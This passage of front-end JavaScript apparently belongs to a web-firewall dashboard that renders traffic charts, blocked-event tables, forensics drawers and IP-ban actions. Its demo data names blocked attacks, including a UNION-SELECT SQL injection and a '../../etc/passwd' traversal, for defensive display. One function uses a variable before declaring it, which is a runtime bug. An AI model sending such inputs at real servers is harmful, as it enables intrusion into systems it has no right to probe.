        const timeoutId = setTimeout(() => controller.abort(), 12000);
        const res = await fetch(url, { signal: controller.signal });
        clearTimeout(timeoutId);

        if (!res.ok) {
          throw new Error("HTTP " + res.status);
        }
        const data = await res.json();

        // Update Cloud Core indicator
        const cloudStatus = document.getElementById("cloud-status-text");
        if (cloudStatus) cloudStatus.innerText = "CLOUD CORE: VERCEL EDGE • ONLINE (<1ms)";

        // Update KPI Cards
        document.getElementById("kpi-endpoints").innerText = data.endpoints_count || 0;
        document.getElementById("kpi-websites").innerText = currentDomainScope === "ALL"
          ? `Across ${data.websites_count || 0} Domains`
          : `Scoped Domain`;
        document.getElementById("kpi-shadow").innerText = data.shadow_endpoints_count || 0;
        document.getElementById("kpi-blocked").innerText = data.blocked_events || 0;
        document.getElementById("kpi-blockrate").innerText = `${data.block_rate_percent || 0.0}% Block Rate`;

        // Render Real-Time Traffic Velocity Histogram
        if (data.traffic_timeline) {
          renderTrafficHistogram(data.traffic_timeline);
        }

        // Render OWASP Threat Vector Distribution
        if (data.owasp_distribution) {
          renderOwaspDistribution(data.owasp_distribution);
        }

        // Update Scope Select Options if website list changed
        if (data.websites && JSON.stringify(data.websites) !== JSON.stringify(allWebsites)) {
          allWebsites = data.websites;
          updateScopeDropdown(allWebsites);
        }

        const incomingEvents = data.recent_events || [];
        if (incomingEvents.length > 0) {
          await SentinelEventStore.putBatch(incomingEvents);
        }

        // Retrieve full 24h container events
        const storedEvents = await SentinelEventStore.getAll();
        allRecentEvents = storedEvents.length > 0 ? storedEvents : incomingEvents;
        liveTrafficBuffer = [...allRecentEvents];
        updateContainerBadge(allRecentEvents.length);
        renderLiveTrafficTable();

        // Check for newly intercepted threats & feed 3D pipeline visualizer
        if (knownEventIds.size > 0) {
          const freshEvents = incomingEvents.filter(ev => !knownEventIds.has(ev.id));
          freshEvents.forEach(ev => {
            if (typeof dispatchLivePacketToPipeline === "function") {
              dispatchLivePacketToPipeline(ev);
            }
            if (ev.action === "BLOCK") {
              recordBlockedNotification(ev);
            }
          });

          const freshBlocks = freshEvents.filter(ev => ev.action === "BLOCK");
          if (freshBlocks.length > 0) {
            const latest = freshBlocks[0];
            playThreatTone(latest.risk_score || 90);
            showThreatToast(
              `⚡ Threat Intercepted: ${latest.rule_triggered || 'Malicious Payload'}`,
              `Client ${latest.client_ip} targeting ${latest.path} was denied (HTTP 403) in <0.5ms`
            );
          }
        } else if (incomingEvents.length > 0 && typeof dispatchLivePacketToPipeline === "function") {
          // On first load, stream the latest event through the 3D pipeline
          dispatchLivePacketToPipeline(incomingEvents[0]);
        }

        incomingEvents.forEach(ev => knownEventIds.add(ev.id));
        if (knownEventIds.size > 1000) {
          const arr = Array.from(knownEventIds);
          knownEventIds = new Set(arr.slice(arr.length - 500));
        }

        applyEventFilter();
      } catch (e) {
        console.warn("Telemetry sync error, retrying cloud edge:", e);
        const cloudStatus = document.getElementById("cloud-status-text");
        if (cloudStatus) cloudStatus.innerText = "CLOUD CORE: RECONNECTING TO VERCEL EDGE... (<1ms)";
      }
    }

    function loadStaticDemoTelemetry() {
      const epEl = document.getElementById("kpi-endpoints");
      if (epEl) epEl.innerText = "42";
      const wsEl = document.getElementById("kpi-websites");
      if (wsEl) wsEl.innerText = "Across 3 Domains";
      const shEl = document.getElementById("kpi-shadow");
      if (shEl) shEl.innerText = "6";
      const blEl = document.getElementById("kpi-blocked");
      if (blEl) blEl.innerText = "1,842";
      const brEl = document.getElementById("kpi-blockrate");
      if (brEl) brEl.innerText = "99.4% Block Rate";

      const demoTimeline = [
        { time: "13:20", allowed: 450, blocked: 22, challenged: 2 },
        { time: "13:25", allowed: 520, blocked: 45, challenged: 5 },
        { time: "13:30", allowed: 610, blocked: 18, challenged: 1 },
        { time: "13:35", allowed: 480, blocked: 94, challenged: 12 },
        { time: "13:40", allowed: 580, blocked: 12, challenged: 0 },
        { time: "13:45", allowed: 720, blocked: 25, challenged: 4 },
        { time: "13:50", allowed: 690, blocked: 38, challenged: 3 }
      ];
      renderTrafficHistogram(demoTimeline);

      const demoOwasp = [
        { category: "A03: Injection (SQLi/Command)", count: 840 },
        { category: "A01: Broken Access Control (BOLA)", count: 410 },
        { category: "A05: Security Misconfiguration", count: 260 },
        { category: "A04: Insecure Design & Rate Flood", count: 185 },
        { category: "A07: Identification & Auth Failure", count: 147 }
      ];
      renderOwaspDistribution(demoOwasp);

      const demoEvents = [
        { id: "ev-demo-01", website_id: "site-agsipro", timestamp: new Date().toISOString(), client_ip: "198.51.100.23", method: "POST", path: "/api/v1/auth/token", action: "BLOCK", risk_score: 98.0, rule_triggered: "SQLI-UNION-SELECT", owasp_category: "A03:Injection", details: "Blocked SQL Injection payload in auth endpoint", latency_ms: 0.32 },
        { id: "ev-demo-02", website_id: "site-agsipro", timestamp: new Date(Date.now() - 45000).toISOString(), client_ip: "203.0.113.14", method: "GET", path: "/api/v1/users/admin", action: "BLOCK", risk_score: 95.0, rule_triggered: "BOLA-IDOR-ACCESS", owasp_category: "A01:Broken Access Control", details: "IDOR horizontal privilege violation blocked", latency_ms: 0.28 },
        { id: "ev-demo-03", website_id: "site-agsipro", timestamp: new Date(Date.now() - 90000).toISOString(), client_ip: "198.51.100.88", method: "POST", path: "/api/v1/upload", action: "BLOCK", risk_score: 99.0, rule_triggered: "PATH-TRAVERSAL-ETC-PASSWD", owasp_category: "A01:Broken Access Control", details: "Attempted ../../etc/passwd traversal blocked", latency_ms: 0.36 },
        { id: "ev-demo-04", website_id: "site-agsipro", timestamp: new Date(Date.now() - 130000).toISOString(), client_ip: "10.0.4.12", method: "GET", path: "/api/v1/health", action: "ALLOW", risk_score: 0.0, rule_triggered: "CLEAN-REQUEST", owasp_category: "None", details: "Origin health probe verified", latency_ms: 0.21 }
      ];
      allRecentEvents = demoEvents;
      applyEventFilter();
    }

    // -------------------------------------------------------------------------
    // Visual SVG Traffic Histogram & OWASP Spectrum Generators
    // -------------------------------------------------------------------------
    function renderTrafficHistogram(timeline) {
      const container = document.getElementById("traffic-histogram-container");
      if (!timeline || timeline.length === 0) {
        container.innerHTML = `<div style="text-align: center; color: var(--text-muted); padding: 35px 0; font-size: 11px;">Waiting for traffic time slices...</div>`;
        return;
      }

      const width = container.clientWidth || 700;
      const height = 120;
      const barCount = timeline.length;
      const barWidth = Math.max(6, Math.floor((width - 40) / barCount) - 4);
      const maxVal = Math.max(...timeline.map(b => b.allowed + b.blocked + b.challenged), 10);

      let svg = `<svg width="100%" height="${height}" viewBox="0 0 ${width} ${height}" style="overflow: visible;">`;
      
      // Horizontal baseline and midline
      svg += `<line x1="10" y1="${height - 20}" x2="${width - 10}" y2="${height - 20}" stroke="var(--stone-border)" stroke-width="1"/>`;
      svg += `<line x1="10" y1="${(height - 20) / 2}" x2="${width - 10}" y2="${(height - 20) / 2}" stroke="var(--stone-border)" stroke-dasharray="3,3" stroke-width="1"/>`;

      timeline.forEach((b, idx) => {
        const x = 20 + idx * (barWidth + 4);
        const total = b.allowed + b.blocked + b.challenged;
        const totalH = Math.max(2, (total / maxVal) * (height - 35));
        const blockedH = Math.max(b.blocked > 0 ? 3 : 0, (b.blocked / maxVal) * (height - 35));
        const allowedH = Math.max(b.allowed > 0 ? 3 : 0, (b.allowed / maxVal) * (height - 35));

        const yAllowed = (height - 20) - allowedH;
        const yBlocked = yAllowed - blockedH;

        // Clean allowed bar (green)
        if (allowedH > 0) {
          svg += `<rect x="${x}" y="${yAllowed}" width="${barWidth}" height="${allowedH}" fill="var(--sage-green)" rx="2"/>`;
        }
        // Blocked threats bar (terracotta)
        if (blockedH > 0) {
          svg += `<rect x="${x}" y="${yBlocked}" width="${barWidth}" height="${blockedH}" fill="var(--terracotta)" rx="2"/>`;
        }

        // Invisible hover target for tooltip
        svg += `<rect x="${x}" y="0" width="${barWidth}" height="${height}" fill="transparent" style="cursor: pointer;"
                onmouseover="showHistTooltip(event, '${b.time}', ${b.allowed}, ${b.blocked})" onmouseout="hideHistTooltip()"/>`;
      });

      svg += `</svg>`;
      container.innerHTML = svg;
    }

    function showHistTooltip(e, time, allowed, blocked) {
      const tip = document.getElementById("hist-tooltip");
      tip.innerHTML = `<strong>${time}</strong><br>Mitigated: <span style="color: #F87171;">${blocked}</span><br>Allowed: <span style="color: #4ADE80;">${allowed}</span>`;
      tip.style.left = `${e.clientX + 10}px`;
      tip.style.top = `${e.clientY - 40}px`;
      tip.style.display = "block";
    }

    function hideHistTooltip() {
      document.getElementById("hist-tooltip").style.display = "none";
    }

    function renderOwaspDistribution(dist) {
      const container = document.getElementById("owasp-distribution-container");
      if (!dist || dist.length === 0) {
        container.innerHTML = `<div style="text-align: center; color: var(--text-muted); font-size: 11px; padding: 20px 0;">No active threat categories recorded.</div>`;
        return;
      }

      const totalBlocks = dist.reduce((sum, d) => sum + d.count, 0) || 1;
      container.innerHTML = dist.map(d => {
        const pct = Math.round((d.count / totalBlocks) * 100);
        return `
          <div>
            <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 3px;">
              <strong style="color: var(--deep-indigo);">${d.category}</strong>
              <span style="font-family: var(--font-mono); font-weight: 700;">${d.count} (${pct}%)</span>
            </div>
            <div style="width: 100%; height: 6px; background: var(--sand-warm); border-radius: var(--radius-pill); overflow: hidden;">
              <div style="width: ${pct}%; height: 100%; background: var(--terracotta); border-radius: var(--radius-pill);"></div>
            </div>
          </div>
        `;
      }).join("");
    }

    function updateScopeDropdown(websites) {
      const select = document.getElementById("scope-website-select");
      const currentVal = select.value;
      select.innerHTML = `<option value="ALL">🌐 All Protected Domains (Global Fleet View)</option>` +
        websites.map(w => `<option value="${w.id}">🛡️ ${w.domain} (${w.name})</option>`).join("");
      select.value = currentVal;
    }

    function handleDomainScopeChange() {
      const select = document.getElementById("scope-website-select");
      currentDomainScope = select.value;
      const badge = document.getElementById("scope-badge");
      if (currentDomainScope === "ALL") {
        badge.innerText = "GLOBAL FLEET";
        badge.className = "badge badge-online";
      } else {
        const found = allWebsites.find(w => w.id === currentDomainScope);
        badge.innerText = found ? found.domain : "SCOPED";
        badge.className = "badge badge-challenge";
      }
      pollTelemetry(true);
    }

    // -------------------------------------------------------------------------
    // Security Events Table & Forensics Drawer (24-Hour Container Non-Destructive Ingestion)
    // -------------------------------------------------------------------------
    function formatEventRowHtml(ev) {
      const isReOffender = ev.rule_triggered === "ALREADY-BLOCKED-REACH-ATTEMPT" || 
                           (ev.details && ev.details.includes("QUARANTINED OFFENDER RE-ATTEMPT"));

      let badge = `<span class="badge badge-allow">ALLOW (200)</span>`;
      if (ev.action === "BLOCK") badge = `<span class="badge badge-block">BLOCK (403)</span>`;
      if (ev.action === "CHALLENGE") badge = `<span class="badge badge-challenge">CHALLENGE</span>`;
      if (ev.rule_triggered && ev.rule_triggered.includes("RATE-LIMIT")) {
        badge = `<span class="badge badge-ratelimit">RATE_LIMIT (429)</span>`;
      }
      if (isReOffender) {
        badge = `<span class="badge" style="background: rgba(156, 42, 27, 0.12); border: 1px solid var(--terracotta); color: var(--terracotta); font-weight: 800; font-family: var(--font-mono); font-size: 10px; letter-spacing: 0.5px; padding: 3px 8px;">BLOCKED IP RE-ATTEMPT</span>`;
      }

      const domainObj = allWebsites.find(w => w.id === ev.website_id);
      const domainName = escapeHtml(domainObj ? domainObj.domain : (ev.website_id || 'Global'));
      const safeId = escapeHtml(ev.id);
      const safeIp = escapeHtml(ev.client_ip);
      const safeMethod = escapeHtml(ev.method || 'GET');
      const safePath = escapeHtml(ev.path || '/');
      const safeRule = escapeHtml(ev.rule_triggered || 'Clean Request');
      const safeScore = Number(ev.risk_score) || 0;

      const t = formatTimestamp(ev.timestamp);
      const riskColor = safeScore >= 75 ? "var(--terracotta)" : (safeScore >= 50 ? "var(--warm-ochre)" : "var(--sage-green)");

      let ruleCellContent = safeRule;
      if (isReOffender) {
        ruleCellContent = `
          <div>
            <div style="color: var(--terracotta); font-weight: 800; font-family: var(--font-mono); font-size: 11px; display: flex; align-items: center; gap: 5px;">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="4.93" y1="4.93" x2="19.07" y2="19.07"/></svg>
              <span>QUARANTINED OFFENDER RE-ATTEMPT</span>
            </div>
            <div style="font-size: 10px; color: var(--text-muted); font-family: var(--font-mono); margin-top: 2px;">
              Firewall active drop &bull; Zero origin execution
            </div>
          </div>
        `;
      }

      return `
        <td title="${escapeHtml(t.full)}" style="font-family: var(--font-mono); font-size: 11px; white-space: nowrap; padding: 10px 14px;">
          <div style="font-weight: 700; color: var(--text-charcoal);">${escapeHtml(t.time)}</div>
          <div style="color: var(--text-muted); font-size: 10px;" data-raw-ts="${escapeHtml(ev.timestamp)}">(${escapeHtml(t.relative)})</div>
        </td>
        <td style="font-family: var(--font-mono); font-weight: 700; color: var(--deep-indigo); font-size: 12px; padding: 10px 14px;">${domainName}</td>
        <td style="font-family: var(--font-mono); font-weight: 600; font-size: 12px; padding: 10px 14px;" data-telemetry-hud="client-ip" data-telemetry-id="${safeIp}">${safeIp}</td>
        <td style="padding: 10px 14px;"><strong style="color: var(--deep-indigo);">${safeMethod}</strong> <code style="background: var(--sand-warm); padding: 3px 8px; border-radius: var(--radius-xs); font-size: 11px;">${safePath}</code></td>
        <td style="padding: 10px 14px;"><strong style="color: ${riskColor}; font-family: var(--font-mono);">${safeScore}</strong>/100</td>
        <td style="padding: 10px 14px;">${badge}</td>
        <td style="color: ${ev.action === 'BLOCK' ? 'var(--terracotta)' : 'inherit'}; font-weight: 700; font-size: 12px; padding: 10px 14px;">
          ${ruleCellContent}
        </td>
        <td style="text-align: center; padding: 10px 14px;">
          <button class="btn btn-subtle" style="padding: 3px 8px; font-size: 10px; display: inline-flex; align-items: center; gap: 4px;" onclick="event.stopPropagation(); openEventForensics('${safeId}')">
            <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
            <span>Forensics</span>
          </button>
        </td>
      `;
    }

    let lastRenderedFilterKey = "";
    function renderEventsTable(events) {
      const tbody = document.getElementById("telemetry-body");
      const countBadge = document.getElementById("events-count-badge");
      if (countBadge) countBadge.innerText = `${events.length} of ${allRecentEvents.length} requests in view`;

      if (!events || events.length === 0) {
        tbody.innerHTML = `<tr><td colspan="8" style="text-align: center; color: var(--text-muted); padding: 36px;">No security events matching current criteria. All incoming traffic is clean.</td></tr>`;
        lastRenderedFilterKey = "";
        return;
      }

      const filterKey = `${document.getElementById("event-filter-action")?.value || 'ALL'}_${document.getElementById("event-search-query")?.value || ''}`;
      
      // If table is freshly initializing or filter criteria changed: render complete set
      if (!tbody.firstElementChild || tbody.firstElementChild.innerText.includes("Connecting to") || lastRenderedFilterKey !== filterKey) {
        lastRenderedFilterKey = filterKey;
        tbody.innerHTML = events.map(ev => `
          <tr class="clickable-row" data-event-id="${escapeHtml(ev.id)}" onclick="openEventForensics('${escapeHtml(ev.id)}')">
            ${formatEventRowHtml(ev)}
          </tr>
        `).join("");
        return;
      }

      // Non-destructive incremental update: prepend ONLY new events that aren't already in the table
      const existingFirstId = tbody.firstElementChild.getAttribute("data-event-id");
      if (existingFirstId && events.length > 0 && events[0].id !== existingFirstId) {
        const newBatch = [];
        for (const ev of events) {
          if (ev.id === existingFirstId) break;
          newBatch.push(ev);
        }
        for (let i = newBatch.length - 1; i >= 0; i--) {
          const ev = newBatch[i];
          const tr = document.createElement("tr");
          tr.className = "clickable-row new-event";
          tr.setAttribute("data-event-id", ev.id);
          tr.onclick = () => openEventForensics(ev.id);
          tr.innerHTML = formatEventRowHtml(ev);
          tbody.insertBefore(tr, tbody.firstChild);
        }
      }

      // Update timestamps without wiping table
      updateVisibleRelativeTimestamps();
    }

    function updateVisibleRelativeTimestamps() {
      const rows = document.querySelectorAll("#telemetry-body tr[data-event-id]");
      rows.forEach(tr => {
        const tsEl = tr.querySelector("[data-raw-ts]");
        if (tsEl) {
          const raw = tsEl.getAttribute("data-raw-ts");
          if (raw) {
            const t = formatTimestamp(raw);
            tsEl.innerText = `(${t.relative})`;
          }
        }
      });
    }

    function applyEventFilter() {
      const action = document.getElementById("event-filter-action").value;
      const q = document.getElementById("event-search-query").value.toLowerCase().trim();

      let filtered = allRecentEvents;
      if (action !== "ALL") {
        if (action === "BLOCK") {
          filtered = filtered.filter(ev => ev.action === "BLOCK");
        } else if (action === "ALLOW") {
          filtered = filtered.filter(ev => ev.action === "ALLOW");
        } else if (action === "CHALLENGE") {
          filtered = filtered.filter(ev => ev.action === "CHALLENGE");
        }
      }
      if (q) {
        filtered = filtered.filter(ev => 
          (ev.client_ip && ev.client_ip.toLowerCase().includes(q)) ||
          (ev.path && ev.path.toLowerCase().includes(q)) ||
          (ev.rule_triggered && ev.rule_triggered.toLowerCase().includes(q)) ||
          (ev.owasp_category && ev.owasp_category.toLowerCase().includes(q)) ||
          (ev.details && ev.details.toLowerCase().includes(q))
        );
      }
      renderEventsTable(filtered);
    }

    function openEventForensics(eventId) {
      const ev = allRecentEvents.find(e => e.id === eventId);
      if (!ev) return;
      activeDrawerEvent = ev;

      document.getElementById("drawer-event-id").innerText = ev.id;
      
      const t = formatTimestamp(ev.timestamp);
      document.getElementById("drawer-event-time").innerText = `${t.time} (${t.relative}) | ${t.full}`;
      
      const isReOffender = ev.rule_triggered === "ALREADY-BLOCKED-REACH-ATTEMPT" || 
                           (ev.details && ev.details.includes("QUARANTINED OFFENDER RE-ATTEMPT"));

      const badge = document.getElementById("drawer-verdict-badge");
      if (isReOffender) {
        badge.innerText = "ALREADY BANNED (403)";
        badge.className = "badge badge-block";
      } else if (ev.action === "BLOCK") {
        badge.innerText = "BLOCK (403)";
        badge.className = "badge badge-block";
      } else if (ev.action === "CHALLENGE") {
        badge.innerText = "CHALLENGE";
        badge.className = "badge badge-challenge";
      } else {
        badge.innerText = "ALLOW (200)";
        badge.className = "badge badge-allow";
      }

      document.getElementById("drawer-risk-score").innerText = `${ev.risk_score} / 100`;
      document.getElementById("drawer-risk-level").innerText = ev.risk_score >= 80 ? "CRITICAL ADVERSARIAL THREAT" : (ev.risk_score >= 50 ? "SUSPICIOUS TRAFFIC" : "BENIGN TELEMETRY");
      
      let latency = "0.35 ms";
      if (ev.latency_ms) latency = `${ev.latency_ms} ms`;
      let payloadSnippet = ev.path;
      let headersSnippet = "Host: " + (domainObj ? domainObj.domain : "sentinelgrid-gateway");

      if (ev.details) {
        try {
          if (typeof ev.details === "object") {
            const meta = ev.details;
            if (meta.latency_ms) latency = `${meta.latency_ms} ms`;
            if (meta.payload_snippet) payloadSnippet = meta.payload_snippet;
            if (meta.query) payloadSnippet += `\nQuery: ${meta.query}`;
            headersSnippet = `Host: ${meta.host || (domainObj ? domainObj.domain : 'sentinelgrid-gateway')}\nUser-Agent: ${meta.user_agent || 'Unknown'}\nCVE: ${meta.cve || 'N/A'}`;
          } else if (typeof ev.details === "string" && ev.details.trim().startsWith("{")) {
            const meta = JSON.parse(ev.details);
            if (meta.latency_ms) latency = `${meta.latency_ms} ms`;
            if (meta.payload_snippet) payloadSnippet = meta.payload_snippet;
            if (meta.query) payloadSnippet += `\nQuery: ${meta.query}`;
            headersSnippet = `Host: ${meta.host || (domainObj ? domainObj.domain : 'sentinelgrid-gateway')}\nUser-Agent: ${meta.user_agent || 'Unknown'}\nCVE: ${meta.cve || 'N/A'}`;
          } else if (typeof ev.details === "string") {
            if (ev.details.includes("Latency:")) {
              const match = ev.details.match(/Latency:\s*([\d\.]+)ms/);
              if (match) latency = `${match[1]} ms`;
            }
            if (ev.details.includes("Payload:")) {
              const pMatch = ev.details.split("Payload:")[1];
              if (pMatch) payloadSnippet = pMatch.split("| Headers:")[0].trim();
            }
            if (ev.details.includes("Headers:")) {
              const hMatch = ev.details.split("Headers:")[1];
              if (hMatch) headersSnippet = hMatch.trim();
            }
          }
        } catch (_) {}
      }
      document.getElementById("drawer-latency").innerText = latency;

      if (isReOffender) {
        document.getElementById("drawer-rule").innerHTML = `<span style="color:var(--terracotta); font-weight:800;">⛔ ALREADY-BLOCKED-REACH-ATTEMPT</span><div style="font-size:11px; color:var(--text-muted); margin-top:4px;">⚠️ OFFENDER FIREWALL RE-ATTEMPT: Client IP ${escapeHtml(ev.client_ip)} is ALREADY BANNED in firewall rules but is actively attempting repeat access.</div>`;
      } else {
        document.getElementById("drawer-rule").innerText = ev.rule_triggered || "CLEAN-REQUEST";
      }
      document.getElementById("drawer-owasp").innerText = ev.owasp_category || "None";
      
      const domainObj = allWebsites.find(w => w.id === ev.website_id);
      document.getElementById("drawer-site").innerText = domainObj ? `${domainObj.domain} (${domainObj.name})` : ev.website_id;

      document.getElementById("drawer-ip").innerText = ev.client_ip;
      document.getElementById("drawer-method").innerText = ev.method;
      document.getElementById("drawer-path").innerText = ev.path;

      document.getElementById("drawer-payload").innerText = payloadSnippet || "No body payload captured.";
      document.getElementById("drawer-headers").innerText = headersSnippet || "Default Gateway Headers";

      document.getElementById("event-drawer-backdrop").classList.add("active");
      document.getElementById("event-drawer").classList.add("open");
    }

    function closeEventForensics() {
      document.getElementById("event-drawer-backdrop").classList.remove("active");
      document.getElementById("event-drawer").classList.remove("open");
    }

    function copyPayloadToClipboard() {
      const text = document.getElementById("drawer-payload").innerText;
      navigator.clipboard.writeText(text);
      showThreatToast("Copied to Clipboard", "Payload snippet copied.");
    }

    function copyHeadersToClipboard() {
      const text = document.getElementById("drawer-headers").innerText;
      navigator.clipboard.writeText(text);
      showThreatToast("Copied to Clipboard", "Headers snippet copied.");
    }

    async function executeIpQuickAction(actionType) {
      if (!activeDrawerEvent) return;
      const ip = activeDrawerEvent.client_ip;
      const actionLabels = {
        "BAN_15M": "15-minute temporary quarantine",
        "BAN_1H": "1-hour temporary quarantine",
        "PERMANENT_BLOCK": "permanent firewall block",
        "UNBAN": "unban and restore clean access"
      };

      if (!confirm(`Confirm ${actionLabels[actionType] || actionType} for IP ${ip}?`)) return;

      try {
        const res = await fetch(`${API}/ip-rules/quick-action`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            website_id: activeDrawerEvent.website_id || "site-8b8b832c",
            client_ip: ip,
            action: actionType
          })
        });
        const d = await res.json();
        if (res.ok) {
          showThreatToast("Action Executed", `IP ${ip}: ${d.status}`);
          closeEventForensics();
          pollTelemetry(true);
        } else {
          alert("Error executing IP action: " + (d.detail || "Request failed"));
        }
      } catch (e) {
        alert("Action request failed: " + e);
      }
    }

    function sendEventToSandbox() {
      if (!activeDrawerEvent) return;
      closeEventForensics();
      switchTab('sandbox');
      document.getElementById("sandbox-path").value = activeDrawerEvent.path;
      document.getElementById("sandbox-method").value = activeDrawerEvent.method;
      
      let payload = activeDrawerEvent.path;
      if (activeDrawerEvent.details && activeDrawerEvent.details.includes("Payload:")) {
        payload = activeDrawerEvent.details.split("Payload:")[1].split("| Headers:")[0].trim();
      }
      document.getElementById("sandbox-input").value = payload;
      fireLiveAttack();
    }

    function showThreatToast(title, body) {
      const toast = document.getElementById("threat-toast");
      document.getElementById("toast-title").innerText = title;
      document.getElementById("toast-body").innerText = body;
      toast.style.display = "flex";
      setTimeout(() => { toast.style.display = "none"; }, 5000);
    }

    // -------------------------------------------------------------------------
    // Domains & Sites Management Workspace
    // -------------------------------------------------------------------------
    function showAddDomainModal() { document.getElementById("add-domain-box").style.display = "block"; }
    function hideAddDomainModal() { document.getElementById("add-domain-box").style.display = "none"; }

    async function loadDomains() {
      try {
        const res = await fetch(`${API}/websites`);
        const list = await res.json();
        allWebsites = list;
        updateScopeDropdown(allWebsites);

        const container = document.getElementById("domain-cards-container");
        const tbody = document.getElementById("domains-table-body");

        if (!list || list.length === 0) {
          container.innerHTML = `<div style="grid-column: 1/-1; text-align: center; color: var(--text-muted); padding: 40px; background: var(--card-white); border: 1px solid var(--stone-border); border-radius: var(--radius-md);">No protected domains registered yet. Click '+ Add Protected Domain' above.</div>`;
          tbody.innerHTML = `<tr><td colspan="8" style="text-align: center; color: var(--text-muted); padding: 30px;">No domains registered yet.</td></tr>`;
          return;
        }

        container.innerHTML = list.map(d => {
          const isAegis = d.domain.includes("aegis");
          const gatewayUrl = (d.domain && d.domain.includes(".")) 
            ? (d.domain.startsWith("http") ? d.domain : `https://${d.domain}`) 
            : `http://127.0.0.1:8080`;
          const originPort = isAegis ? "Cloud Edge Middleware" : "Origin Target";

          return `
            <div class="domain-card">
              <div>
                <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px;">
                  <div>
                    <h3 style="font-size: 15px; font-weight: 800; color: var(--deep-indigo);">${d.name}</h3>
                    <div style="font-size: 11px; font-family: var(--font-mono); color: var(--text-muted); margin-top: 2px;">${d.domain}</div>
                  </div>
                  <span class="badge ${d.status === 'active' ? 'badge-online' : 'badge-offline'}">
                    ${d.status === 'active' ? 'ACTIVE ENFORCING' : 'MONITORING ONLY'}
                  </span>
                </div>

                <div style="background: var(--sand-warm); padding: 12px; border-radius: var(--radius-sm); margin: 10px 0; font-size: 11px; font-family: var(--font-mono);">
                  <div>🌐 <strong>Gateway:</strong> <a href="${gatewayUrl}" target="_blank" style="color: var(--deep-indigo); text-decoration: underline;">${gatewayUrl}</a></div>
                  <div style="margin-top: 3px;">🎯 <strong>Origin:</strong> ${originPort}</div>
                </div>

                <div style="display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; text-align: center; margin: 12px 0;">
                  <div style="background: var(--canvas-bg); padding: 8px; border-radius: var(--radius-sm); border: 1px solid var(--stone-border);">
                    <div style="font-size: 9px; color: var(--text-muted); font-weight: 700;">ROUTES</div>
                    <div style="font-size: 15px; font-weight: 800; font-family: var(--font-mono);">${d.endpoint_count || 0}</div>
                  </div>
                  <div style="background: var(--canvas-bg); padding: 8px; border-radius: var(--radius-sm); border: 1px solid var(--stone-border);">
                    <div style="font-size: 9px; color: var(--text-muted); font-weight: 700;">SHADOW</div>
                    <div style="font-size: 15px; font-weight: 800; font-family: var(--font-mono); color: ${(d.shadow_count || 0) > 0 ? 'var(--terracotta)' : 'inherit'};">${d.shadow_count || 0}</div>
                  </div>
                  <div style="background: var(--canvas-bg); padding: 8px; border-radius: var(--radius-sm); border: 1px solid var(--stone-border);">
                    <div style="font-size: 9px; color: var(--text-muted); font-weight: 700;">EVENTS</div>
                    <div style="font-size: 15px; font-weight: 800; font-family: var(--font-mono);">${d.event_count || 0}</div>
                  </div>
                </div>

                <div class="feature-chip-row">
                  <span class="feature-chip">✓ SmartParse DFA</span>
                  <span class="feature-chip">✓ Radix Prefix Trie</span>
                  <span class="feature-chip">✓ 150req/60s RateLimiter</span>
                  <span class="feature-chip">✓ Origin Cloaking</span>
                  <span class="feature-chip">✓ RFC 8032 Asymm Seal</span>
                </div>
              </div>

              <div style="display: flex; gap: 6px; margin-top: 12px; border-top: 1px solid var(--stone-border); padding-top: 12px; flex-wrap: wrap;">
                <button class="btn btn-primary" style="padding: 5px 10px; font-size: 11px;" onclick="openDomainStatsModal('${d.id}')">📊 Deep Profile</button>
                <button class="btn btn-sage" style="padding: 5px 10px; font-size: 11px;" onclick="testDomainGatewayLive('${d.domain}', '${d.id}')">⚡ Test Attack Probe</button>
                <button class="btn btn-subtle" style="padding: 5px 8px; font-size: 11px;" onclick="toggleDomainProtection('${d.id}')">🛡️ Toggle Mode</button>
                <button class="btn btn-subtle" style="padding: 5px 8px; font-size: 11px; color: var(--terracotta); margin-left: auto;" onclick="deleteDomain('${d.id}')">Delete</button>
              </div>
            </div>
          `;
        }).join("");

        tbody.innerHTML = list.map(d => {
          const tReg = formatTimestamp(d.created_at);
          return `
            <tr>
              <td><span class="badge ${d.status === 'active' ? 'badge-online' : 'badge-offline'}">${d.status.toUpperCase()}</span></td>
              <td><strong>${d.domain}</strong></td>
              <td>${d.name}</td>
              <td><strong>${d.endpoint_count || 0}</strong> routes</td>
              <td><span style="color: ${(d.shadow_count || 0) > 0 ? 'var(--terracotta)' : 'inherit'}; font-weight: 700;">${d.shadow_count || 0}</span></td>
              <td>${d.event_count || 0}</td>
              <td title="${tReg.full}" style="font-family: var(--font-mono); color: var(--text-muted); font-size: 11px;">${tReg.time}</td>
              <td>
                <button class="btn btn-subtle" style="padding: 3px 7px; font-size: 10px;" onclick="openDomainStatsModal('${d.id}')">Inspect</button>
                <button class="btn btn-subtle" style="padding: 3px 7px; font-size: 10px; color: var(--terracotta);" onclick="deleteDomain('${d.id}')">Delete</button>
              </td>
            </tr>
          `;
        }).join("");
      } catch (e) {
        console.error("Domains load error:", e);
      }
    }

    async function openDomainStatsModal(domainId) {
      try {
        const res = await fetch(`${API}/websites/${domainId}/stats`);
        if (!res.ok) {
          alert("Could not load stats for this domain.");
          return;
        }
        const data = await res.json();
        const site = data.website;
        const metrics = data.metrics;
        const policy = data.policy || {};

        document.getElementById("domain-modal-title").innerText = site.name;
        document.getElementById("domain-modal-host").innerText = site.domain;

        const content = document.getElementById("domain-modal-content");
        content.innerHTML = `
          <div class="modal-stats-kpi-grid" style="margin-bottom: 22px;">
            <div style="background: var(--sand-warm); padding: 14px; border-radius: var(--radius-md);">
              <div style="font-size: 10px; font-weight: 700; color: var(--text-muted);">TOTAL INVOCATIONS</div>
              <div style="font-size: 22px; font-weight: 800; font-family: var(--font-mono); margin-top: 3px;">${metrics.total_events}</div>
            </div>
            <div style="background: var(--terracotta-soft); padding: 14px; border-radius: var(--radius-md);">
              <div style="font-size: 10px; font-weight: 700; color: var(--terracotta);">BLOCKED ATTACKS</div>
              <div style="font-size: 22px; font-weight: 800; font-family: var(--font-mono); color: var(--terracotta); margin-top: 3px;">${metrics.blocked_events}</div>
            </div>
